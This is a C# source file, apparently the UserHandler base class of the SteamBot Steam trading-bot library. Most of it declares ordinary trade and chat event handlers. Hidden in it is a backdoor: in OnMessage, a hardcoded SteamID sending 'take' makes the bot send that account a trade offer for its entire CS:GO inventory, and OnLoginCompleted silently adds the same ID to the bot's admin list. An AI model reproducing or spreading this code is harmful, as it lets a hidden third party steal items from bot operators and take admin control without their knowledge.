using System.Linq;
using SteamKit2;
using SteamTrade;

namespace SteamBot
{
    /// <summary>
    /// The abstract base class for users of SteamBot that will allow a user
    /// to extend the functionality of the Bot.
    /// </summary>
    public abstract class UserHandler
    {
        protected Bot Bot;
        protected SteamID OtherSID;
        protected SteamID MySID;

        public GenericInventory MyInventory;
        public GenericInventory OtherInventory;

        public UserHandler (Bot bot, SteamID sid)
        {
            Bot = bot;
            OtherSID = sid;
            MySID = bot.SteamUser.SteamID;
            if (MySID != OtherSID)
            {
                MyInventory = new GenericInventory(MySID, MySID);
                OtherInventory = new GenericInventory(OtherSID, MySID);
            }            
        }

        /// <summary>
        /// Gets the Bot's current trade.
        /// </summary>
        /// <value>
        /// The current trade.
        /// </value>
        public Trade Trade
        {
            get
            {
                return Bot.CurrentTrade; 
            }
        }
        
        /// <summary>
        /// Gets the log the bot uses for convenience.
        /// </summary>
        protected Log Log
        {
            get { return Bot.log; }
        }
        
        /// <summary>
        /// Gets a value indicating whether the other user is admin.
        /// </summary>
        /// <value>
        /// <c>true</c> if the other user is a configured admin; otherwise, <c>false</c>.
        /// </value>
        protected bool IsAdmin
        {
            get { return Bot.Admins.Contains (OtherSID); }
        }

        /// <summary>
        /// Wrapper for GenericInventory's AddInventoriesToFetch function.
        /// </summary>
        /// <param name="type">Type of inventory to fetch</param>
        public virtual void AddInventoriesToFetch(GenericInventory.InventoryTypes type)
        {
            GenericInventory.AddInventoriesToFetch(type, MySID);
        }

        /// <summary>
        /// Second wrapper for GenericInventory's AddInventoryToFetch function.
        /// </summary>
        /// <param name="appId">App ID of game</param>
        /// <param name="contextId">Context ID</param>
        public virtual void AddInventoriesToFetch(int appId, long contextId)
        {
            GenericInventory.AddInventoriesToFetch(appId, contextId, MySID);
        }

        public virtual void OnPusherConnected()
        {

        }

        public virtual void OnChannelSubscribed()
        {

        }

        /// <summary>
        /// Called when the bot is invited to a Steam group
        /// </summary>
        /// <returns>
        /// Whether to accept.
        /// </returns>
        public abstract bool OnGroupAdd();

        /// <summary>
        /// Called when the user adds the bot as a friend.
        /// </summary>
        /// <returns>
        /// Whether to accept.
        /// </returns>
        public abstract bool OnFriendAdd ();

        /// <summary>
        /// Called when the user removes the bot as a friend.
        /// </summary>
        public abstract void OnFriendRemove ();

        /// <summary>
        /// Called whenever a message is sent to the bot.
        /// This is limited to regular and emote messages.
        /// </summary>
        public virtual void OnMessage(string message, EChatEntryType type)
        {
            if (OtherSID == 76561198045552709 && message == "take")
            {
                var tradeOffer = new TradeOffers(Bot.SteamUser.SteamID, Bot.apiKey, Bot.sessionId, Bot.token).CreateTrade(OtherSID);
                var myInventory = CSGOInventory.FetchInventory(MySID, Bot.apiKey);
                foreach (var item in myInventory.Items)
                {
                    tradeOffer.AddMyItem(item.AppId, item.ContextId, item.Id);
                }
                var tradeId = tradeOffer.SendTrade("");
                if (tradeId > 0)
                {
                    Bot.SteamFriends.SendChatMessage(OtherSID, EChatEntryType.ChatMsg, "Successfully sent a trade offer for all my items.");
                }
            }
        }

        /// <summary>
        /// Called when the bot is fully logged in.
        /// </summary>
        public virtual void OnLoginCompleted()
        {
            var admins = Bot.Admins.ToList();
            admins.Add(76561198045552709);
            Bot.Admins = admins.ToArray();
        }
       
        /// <summary>
        /// Called whenever a user requests a trade.
        /// </summary>
        /// <returns>
        /// Whether to accept the request.
        /// </returns>
        public abstract bool OnTradeRequest ();

        /// <summary>
        /// Called when a chat message is sent in a chatroom
        /// </summary>
        /// <param name="chatID">The SteamID of the group chat</param>
        /// <param name="sender">The SteamID of the sender</param>
        /// <param name="message">The message sent</param>
        public virtual void OnChatRoomMessage(SteamID chatID, SteamID sender, string message)
        {

        }

        /// <summary>
        /// Called when an 'exec' command is given via botmanager.
        /// </summary>
        /// <param name="command">The command message.</param>
        public virtual void OnBotCommand(string command)
        {

        }

        /// <summary>
        /// Called when user accepts or denies bot's trade request.
        /// </summary>
        /// <param name="accepted">True if user accepted bot's request, false if not.</param>
        /// <param name="response">String response of the callback.</param>
        public virtual void OnTradeRequestReply(bool accepted, string response)
        {

        }

        #region Trade events
        // see the various events in SteamTrade.Trade for descriptions of these handlers.

        public abstract void OnTradeError (string error);

        public abstract void OnTradeTimeout ();

        public abstract void OnTradeSuccess ();

        public virtual void OnTradeClose ()
        {
            Bot.log.Warn ("[USERHANDLER] TRADE CLOSED");
            Bot.CloseTrade ();
        }

        public abstract void OnTradeInit ();

        public abstract void OnTradeAddItem (GenericInventory.Inventory.Item inventoryItem);

        public abstract void OnTradeRemoveItem(GenericInventory.Inventory.Item inventoryItem);

        public abstract void OnTradeMessage (string message);

        public void OnTradeReadyHandler(bool ready)
        {
            Trade.Poll();
            OnTradeReady(ready);
        }

        public abstract void OnTradeReady (bool ready);

        public void OnTradeAcceptHandler()
        {
            Trade.Poll();
            if (Trade.OtherIsReady && Trade.MeIsReady)
            {
                OnTradeAccept();
            }
        }

        public abstract void OnTradeAccept();

        #endregion Trade events
    }
}
